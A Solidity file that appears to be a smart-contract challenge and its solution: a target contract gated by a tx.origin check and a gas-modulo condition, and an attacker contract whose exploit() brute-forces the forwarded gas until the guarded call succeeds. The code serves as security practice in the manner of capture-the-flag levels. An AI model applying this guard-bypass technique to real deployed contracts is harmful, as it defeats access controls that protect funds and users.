pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.3.0/contracts/math/SafeMath.sol";
//import '@openzeppelin/contracts/math/SafeMath.sol';

contract ItSDoneIn2Sec {
    
    using SafeMath for uint256;
    address payable public entrant;
    address payable private owner;
    address private mainContract;
    
    constructor(address _mainContract) public {
        entrant = msg.sender;
        owner = msg.sender;
        mainContract = _mainContract;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier gasConsume() {
        require (msg.sender != tx.origin);
        _;
    }
    
    modifier isNotAContract() {
        require(gasleft().mod(984) == 0);
        _;
    }
    
    function ItSSuperEasy() public isNotAContract gasConsume {
        entrant = msg.sender;
        if (owner != entrant)
            address(mainContract).call(abi.encodeWithSignature("setOrder(uint8)", 2));
    }
    
}

contract ByPassItsDoneIn2Sec {
    
    ItSDoneIn2Sec originalContract;
    
    constructor(address payable _originalContract) public {
        originalContract =ItSDoneIn2Sec(_originalContract);
    }
    
    function exploit() public {
        for (uint256 i = 0; i < 350; i++) {
            (bool ret, bytes memory data) = address(originalContract).call.gas(i + 984*3)(abi.encodeWithSignature('ItSSuperEasy()'));
            if (ret)
                break;
        }
    }
    
}
